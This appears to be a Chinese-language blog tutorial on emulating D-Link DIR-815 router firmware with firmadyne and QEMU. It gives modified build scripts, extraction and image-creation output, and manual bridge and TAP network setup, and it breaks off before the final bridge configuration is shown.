<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"><span class="built_in">set</span> -u</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -e ./firmadyne.config ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">source</span> ./firmadyne.config</span><br><span class="line"><span class="keyword">elif</span> [ -e ../firmadyne.config ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">source</span> ../firmadyne.config</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: Could not find &#x27;firmadyne.config&#x27;!&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> check_number <span class="variable">$1</span>; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: makeImage.sh &lt;image ID&gt; [&lt;architecture]&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">IID=<span class="variable">$&#123;1&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> check_root; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: This script requires root privileges!&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -eq 1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: No arch selected!&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> check_arch <span class="string">&quot;<span class="variable">$&#123;2&#125;</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: Invalid architecture!&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">ARCH=<span class="variable">$&#123;2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Running----&quot;</span></span><br><span class="line">WORK_DIR=`get_scratch <span class="variable">$&#123;IID&#125;</span>`    <span class="comment"># no need to change</span></span><br><span class="line">IMAGE=`get_fs <span class="variable">$&#123;IID&#125;</span>`            <span class="comment"># no need to change</span></span><br><span class="line">IMAGE_DIR=`get_fs_mount <span class="variable">$&#123;IID&#125;</span>`  <span class="comment"># no need to change</span></span><br><span class="line">CONSOLE=`get_console <span class="variable">$&#123;ARCH&#125;</span>`</span><br><span class="line">LIBNVRAM=`get_nvram <span class="variable">$&#123;ARCH&#125;</span>`</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Creating working directory <span class="variable">$&#123;WORK_DIR&#125;</span>----&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$&#123;WORK_DIR&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">chmod</span> a+rwx <span class="string">&quot;<span class="variable">$&#123;WORK_DIR&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">chown</span> -R <span class="string">&quot;<span class="variable">$&#123;USER&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;WORK_DIR&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">chgrp</span> -R <span class="string">&quot;<span class="variable">$&#123;USER&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;WORK_DIR&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -e <span class="string">&quot;<span class="variable">$&#123;TARBALL_DIR&#125;</span>/<span class="variable">$&#123;IID&#125;</span>.tar.gz&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: Cannot find tarball of root filesystem for <span class="variable">$&#123;IID&#125;</span>!&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TARBALL_SIZE=$(tar ztvf <span class="string">&quot;<span class="variable">$&#123;TARBALL_DIR&#125;</span>/<span class="variable">$&#123;IID&#125;</span>.tar.gz&quot;</span> --totals 2&gt;&amp;1 |<span class="built_in">tail</span> -1|<span class="built_in">cut</span> -f2 -d<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">MINIMUM_IMAGE_SIZE=$((TARBALL_SIZE + <span class="number">10</span> * <span class="number">1024</span> * <span class="number">1024</span>))</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----The size of root filesystem &#x27;<span class="variable">$&#123;TARBALL_DIR&#125;</span>/<span class="variable">$&#123;IID&#125;</span>.tar.gz&#x27; is <span class="variable">$TARBALL_SIZE</span>-----&quot;</span></span><br><span class="line">IMAGE_SIZE=8388608</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$IMAGE_SIZE</span> -le <span class="variable">$MINIMUM_IMAGE_SIZE</span> ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    IMAGE_SIZE=$((IMAGE_SIZE*<span class="number">2</span>))</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Creating QEMU Image <span class="variable">$&#123;IMAGE&#125;</span> with size <span class="variable">$&#123;IMAGE_SIZE&#125;</span>----&quot;</span></span><br><span class="line">qemu-img create -f raw <span class="string">&quot;<span class="variable">$&#123;IMAGE&#125;</span>&quot;</span> <span class="variable">$IMAGE_SIZE</span></span><br><span class="line"><span class="built_in">chmod</span> a+rw <span class="string">&quot;<span class="variable">$&#123;IMAGE&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Creating Partition Table----&quot;</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;o\nn\np\n1\n\n\nw&quot;</span> | /sbin/fdisk <span class="string">&quot;<span class="variable">$&#123;IMAGE&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Mounting QEMU Image----&quot;</span></span><br><span class="line">DEVICE=$(get_device <span class="string">&quot;<span class="subst">$(kpartx -a -s -v <span class="string">&quot;<span class="variable">$&#123;IMAGE&#125;</span>&quot;</span>)</span>&quot;</span>)</span><br><span class="line"><span class="built_in">sleep</span> 1</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Device mapper created at <span class="variable">$&#123;DEVICE&#125;</span>----&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Creating Filesystem----&quot;</span></span><br><span class="line">mkfs.ext2 <span class="string">&quot;<span class="variable">$&#123;DEVICE&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">sync</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Making QEMU Image Mountpoint at <span class="variable">$&#123;IMAGE_DIR&#125;</span>----&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ ! -e <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">mkdir</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">chown</span> <span class="string">&quot;<span class="variable">$&#123;USER&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Mounting QEMU Image Partition 1----&quot;</span></span><br><span class="line">mount <span class="string">&quot;<span class="variable">$&#123;DEVICE&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Extracting Filesystem Tarball to Mountpoint----&quot;</span></span><br><span class="line">tar -xf <span class="string">&quot;<span class="variable">$&#123;TARBALL_DIR&#125;</span>/<span class="variable">$&#123;IID&#125;</span>.tar.gz&quot;</span> -C <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Creating FIRMADYNE Directories----&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/firmadyne/&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/firmadyne/libnvram/&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/firmadyne/libnvram.override/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Patching Filesystem (chroot)----&quot;</span></span><br><span class="line"><span class="built_in">cp</span> $(<span class="built_in">which</span> busybox) <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">cp</span> <span class="string">&quot;<span class="variable">$&#123;SCRIPT_DIR&#125;</span>/fixImage.sh&quot;</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">chroot</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>&quot;</span> /busybox ash /fixImage.sh</span><br><span class="line"><span class="built_in">rm</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/fixImage.sh&quot;</span></span><br><span class="line"><span class="built_in">rm</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/busybox&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Setting up FIRMADYNE----&quot;</span></span><br><span class="line"><span class="built_in">cp</span> <span class="string">&quot;<span class="variable">$&#123;CONSOLE&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/firmadyne/console&quot;</span></span><br><span class="line"><span class="built_in">chmod</span> a+x <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/firmadyne/console&quot;</span></span><br><span class="line"><span class="built_in">mknod</span> -m 666 <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/firmadyne/ttyS1&quot;</span> c 4 65</span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> <span class="string">&quot;<span class="variable">$&#123;LIBNVRAM&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/firmadyne/libnvram.so&quot;</span></span><br><span class="line"><span class="built_in">chmod</span> a+x <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/firmadyne/libnvram.so&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> <span class="string">&quot;<span class="variable">$&#123;SCRIPT_DIR&#125;</span>/preInit.sh&quot;</span> <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/firmadyne/preInit.sh&quot;</span></span><br><span class="line"><span class="built_in">chmod</span> a+x <span class="string">&quot;<span class="variable">$&#123;IMAGE_DIR&#125;</span>/firmadyne/preInit.sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Unmounting QEMU Image----&quot;</span></span><br><span class="line"><span class="built_in">sync</span></span><br><span class="line">umount <span class="string">&quot;<span class="variable">$&#123;DEVICE&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;----Deleting device mapper----&quot;</span></span><br><span class="line">kpartx -d <span class="string">&quot;<span class="variable">$&#123;IMAGE&#125;</span>&quot;</span></span><br><span class="line">losetup -d <span class="string">&quot;<span class="variable">$&#123;DEVICE&#125;</span>&quot;</span> &amp;&gt;/dev/null</span><br><span class="line">dmsetup remove $(<span class="built_in">basename</span> <span class="string">&quot;<span class="variable">$DEVICE</span>&quot;</span>) &amp;&gt;/dev/null</span><br></pre></td></tr></table></figure></div>

<p>修改 inferNetwork.sh</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"><span class="built_in">set</span> -u</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -e ./firmadyne.config ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">source</span> ./firmadyne.config</span><br><span class="line"><span class="keyword">elif</span> [ -e ../firmadyne.config ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">source</span> ../firmadyne.config</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: Could not find &#x27;firmadyne.config&#x27;!&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> check_number <span class="variable">$1</span>; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: inferNetwork.sh &lt;image ID&gt; [&lt;architecture&gt;]&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">IID=<span class="variable">$&#123;1&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -eq 1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: No arch selected!&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> check_arch <span class="string">&quot;<span class="variable">$&#123;2&#125;</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: Invalid architecture!&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">ARCH=<span class="variable">$&#123;2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Running firmware <span class="variable">$&#123;IID&#125;</span>: terminating after 60 secs...&quot;</span></span><br><span class="line"><span class="built_in">timeout</span> --preserve-status --signal SIGINT 60 <span class="string">&quot;<span class="variable">$&#123;SCRIPT_DIR&#125;</span>/run.<span class="variable">$&#123;ARCH&#125;</span>.sh&quot;</span> <span class="string">&quot;<span class="variable">$&#123;IID&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">sleep</span> 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Inferring network...&quot;</span></span><br><span class="line"><span class="string">&quot;<span class="variable">$&#123;SCRIPT_DIR&#125;</span>/makeNetwork.py&quot;</span> -i <span class="string">&quot;<span class="variable">$&#123;IID&#125;</span>&quot;</span> -q -o -a <span class="string">&quot;<span class="variable">$&#123;ARCH&#125;</span>&quot;</span> -S <span class="string">&quot;<span class="variable">$&#123;SCRATCH_DIR&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Done!&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h2 id="模拟固件"><a href="#模拟固件" class="headerlink" title="模拟固件"></a>模拟固件</h2><p>按照 firmadyne 官方给出的步骤，先尝试对固件进行模拟。</p>
<p>下载 DIR-815 固件，放在 firmadyne 目录下，先对固件解包</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 ./sources/extractor/extractor.py -np -nk ./DIR815A1_FW104b03.bin</span><br><span class="line"></span><br><span class="line">输出信息</span><br><span class="line"></span><br><span class="line">/home/iot/Tools/firmadyne/DIR815A1_FW104b03.bin</span><br><span class="line">&gt;&gt; MD5: 34b013a393503d9b9d0734ecd2ee28dd</span><br><span class="line">&gt;&gt; Tag: DIR815A1_FW104b03.bin_34b013a393503d9b9d0734ecd2ee28dd</span><br><span class="line">&gt;&gt; Temp: /tmp/tmpc9h97s71</span><br><span class="line">&gt;&gt; Status: Kernel: True, Rootfs: False, Do_Kernel: False,                 Do_Rootfs: True</span><br><span class="line">&gt;&gt; Recursing into archive ...</span><br><span class="line">&gt;&gt;&gt;&gt; Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2680303 bytes, 1515 inodes, blocksize: 524288 bytes, created: 2013-05-15 10:04:17</span><br><span class="line">&gt;&gt;&gt;&gt; Found Linux filesystem in /tmp/tmpc9h97s71/_DIR815A1_FW104b03.bin.extracted/squashfs-root!</span><br><span class="line">&gt;&gt; Skipping: completed!</span><br><span class="line">&gt;&gt; Cleaning up /tmp/tmpc9h97s71...</span><br></pre></td></tr></table></figure></div>

<p>解包后在 images 目录下能够看到一个压缩包文件，我们把它的名字修改为 1.tar.gz</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv ./images/DIR815A1_FW104b03.bin_34b013a393503d9b9d0734ecd2ee28dd.tar.gz ./images/1.tar.gz</span><br></pre></td></tr></table></figure></div>

<p>获取固件架构</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./scripts/getArch.sh ./images/1.tar.gz</span><br><span class="line"></span><br><span class="line">输出信息</span><br><span class="line"></span><br><span class="line">./bin/busybox: mipsel</span><br></pre></td></tr></table></figure></div>

<p>构建镜像</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ./scripts/makeImage.sh 1 mipsel</span><br><span class="line"></span><br><span class="line">输出信息</span><br><span class="line"></span><br><span class="line">----Running----</span><br><span class="line">----Creating working directory /home/iot/Tools/firmadyne//scratch//1/----</span><br><span class="line">----The size of root filesystem &#x27;/home/iot/Tools/firmadyne//images//1.tar.gz&#x27; is 14008320-----</span><br><span class="line">----Creating QEMU Image /home/iot/Tools/firmadyne//scratch//1//image.raw with size 33554432----</span><br><span class="line">Formatting &#x27;/home/iot/Tools/firmadyne//scratch//1//image.raw&#x27;, fmt=raw size=33554432</span><br><span class="line">----Creating Partition Table----</span><br><span class="line"></span><br><span class="line">欢迎使用 fdisk (util-linux 2.34)。</span><br><span class="line">更改将停留在内存中，直到您决定将更改写入磁盘。</span><br><span class="line">使用写入命令前请三思。</span><br><span class="line"></span><br><span class="line">设备不包含可识别的分区表。</span><br><span class="line">创建了一个磁盘标识符为 0x75dcd7ac 的新 DOS 磁盘标签。</span><br><span class="line"></span><br><span class="line">命令(输入 m 获取帮助)： 创建了一个磁盘标识符为 0xd763342d 的新 DOS 磁盘标签。</span><br><span class="line"></span><br><span class="line">命令(输入 m 获取帮助)： 分区类型</span><br><span class="line">   p   主分区 (0个主分区，0个扩展分区，4空闲)</span><br><span class="line">   e   扩展分区 (逻辑分区容器)</span><br><span class="line">选择 (默认 p)： 分区号 (1-4, 默认  1): 第一个扇区 (2048-65535, 默认 2048): Last sector, +/-sectors or +/-size&#123;K,M,G,T,P&#125; (2048-65535, 默认 65535): </span><br><span class="line">创建了一个新分区 1，类型为“Linux”，大小为 31 MiB。</span><br><span class="line"></span><br><span class="line">命令(输入 m 获取帮助)： 分区表已调整。</span><br><span class="line">正在同步磁盘。</span><br><span class="line"></span><br><span class="line">----Mounting QEMU Image----</span><br><span class="line">----Device mapper created at /dev/mapper/loop12p1----</span><br><span class="line">----Creating Filesystem----</span><br><span class="line">mke2fs 1.45.5 (07-Jan-2020)</span><br><span class="line">丢弃设备块： 完成                            </span><br><span class="line">创建含有 7936 个块（每块 4k）和 7936 个inode的文件系统</span><br><span class="line"></span><br><span class="line">正在分配组表： 完成                            </span><br><span class="line">正在写入inode表： 完成                            </span><br><span class="line">写入超级块和文件系统账户统计信息： 已完成</span><br><span class="line"></span><br><span class="line">----Making QEMU Image Mountpoint at /home/iot/Tools/firmadyne//scratch//1//image/----</span><br><span class="line">----Mounting QEMU Image Partition 1----</span><br><span class="line">----Extracting Filesystem Tarball to Mountpoint----</span><br><span class="line">----Creating FIRMADYNE Directories----</span><br><span class="line">----Patching Filesystem (chroot)----</span><br><span class="line">Creating /etc/TZ!</span><br><span class="line">Creating /etc/hosts!</span><br><span class="line">Creating /etc/passwd!</span><br><span class="line">Warning: Recreating device nodes!</span><br><span class="line">----Setting up FIRMADYNE----</span><br><span class="line">----Unmounting QEMU Image----</span><br><span class="line">----Deleting device mapper----</span><br><span class="line">loop deleted : /dev/loop12</span><br></pre></td></tr></table></figure></div>

<p>此时在 scratch&#x2F;1&#x2F; 目录下可以找到构建好的 image.raw 镜像。</p>
<p>模拟网络环境</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./scripts/inferNetwork.sh 1 mipsel</span><br><span class="line"></span><br><span class="line">输出信息</span><br><span class="line"></span><br><span class="line">Running firmware 1: terminating after 60 secs...</span><br><span class="line">qemu-system-mipsel: terminating on signal 2 from pid 30275 (timeout)</span><br><span class="line">Inferring network...</span><br><span class="line">Interfaces: [(&#x27;br0&#x27;, &#x27;192.168.0.1&#x27;)]</span><br><span class="line">Done!</span><br></pre></td></tr></table></figure></div>

<p>可以看到 firmadyne 获取到镜像的网卡 br0 的 ip 地址为 192.168.0.1，并且在 .&#x2F;scratch&#x2F;1&#x2F; 目录下生成了 run.sh 启动脚本，我们执行这个脚本看看能否访问到固件的 web 界面。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./scratch/1/run.sh</span><br></pre></td></tr></table></figure></div>

<p>启动后进入 shell，看一下网卡信息</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">br0       Link encap:Ethernet  HWaddr 00:DE:FA:1A:01:00  </span><br><span class="line">          inet addr:192.168.0.1  Bcast:192.168.0.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::2de:faff:fe1a:100/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:46 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:10386 (10.1 KiB)</span><br><span class="line"></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 52:54:00:12:34:56  </span><br><span class="line">          BROADCAST MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br><span class="line"></span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 52:54:00:12:34:57  </span><br><span class="line">          BROADCAST MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br><span class="line"></span><br><span class="line">eth2      Link encap:Ethernet  HWaddr 00:DE:FA:1A:01:00  </span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:33 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:200 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:9348 (9.1 KiB)</span><br><span class="line"></span><br><span class="line">eth3      Link encap:Ethernet  HWaddr 00:DE:FA:3A:01:00  </span><br><span class="line">          BROADCAST MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:200 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br><span class="line">       </span><br><span class="line">ip6tnl0   Link encap:UNSPEC  HWaddr 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  </span><br><span class="line">          NOARP  MTU:1452  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br><span class="line"></span><br><span class="line">sit0      Link encap:IPv6-in-IPv4  </span><br><span class="line">          NOARP  MTU:1480  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br><span class="line"></span><br><span class="line">tunl0     Link encap:UNSPEC  HWaddr 00-00-00-00-B5-7F-00-00-00-00-00-00-00-00-00-00  </span><br><span class="line">          NOARP  MTU:1480  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br></pre></td></tr></table></figure></div>

<p>只有 br0、eth2、lo 三个网卡被启用，且只有 br0 拥有 IP 地址，此时宿主机和虚拟机之间网络是不通的。</p>
<p>(ctrl-a x 退出虚拟机)</p>
<h2 id="配置网络"><a href="#配置网络" class="headerlink" title="配置网络"></a>配置网络</h2><p>既然自动配置的网络无法正常使用，我们尝试手动配置。(<a href="https://wzt.ac.cn/2021/05/28/QEMU-networking/">参考</a>)</p>
<p>创建网桥</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig &lt;你的网卡名称(能上网的那张)&gt; down    # 首先关闭宿主机网卡接口</span><br><span class="line">brctl addbr br0                     # 添加名为 br0 的网桥</span><br><span class="line">brctl addif br0 &lt;你的网卡名称&gt;        # 在 br0 中添加一个接口</span><br><span class="line">brctl stp br0 off                   # 如果只有一个网桥，则关闭生成树协议</span><br><span class="line">brctl setfd br0 1                   # 设置 br0 的转发延迟</span><br><span class="line">brctl sethello br0 1                # 设置 br0 的 hello 时间</span><br><span class="line">ifconfig br0 0.0.0.0 promisc up     # 启用 br0 接口</span><br><span class="line">ifconfig &lt;你的网卡名称&gt; 0.0.0.0 promisc up    # 启用网卡接口</span><br><span class="line">dhclient br0                        # 从 dhcp 服务器获得 br0 的 IP 地址</span><br><span class="line">brctl show br0                      # 查看虚拟网桥列表</span><br><span class="line">brctl showstp br0                   # 查看 br0 的各接口信息</span><br></pre></td></tr></table></figure></div>

<p>创建 TAP 虚拟网卡</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tunctl -t tap0 -u root              # 创建一个 tap0 接口，只允许 root 用户访问</span><br><span class="line">brctl addif br0 tap0                # 在虚拟网桥中增加一个 tap0 接口</span><br><span class="line">ifconfig tap0 0.0.0.0 promisc up    # 启用 tap0 接口</span><br><span class="line">brctl showstp br0                   # 显示 br0 的各个接口</span><br></pre></td></tr></table></figure></div>

<p>配置无误的话网桥信息应该如下</p>
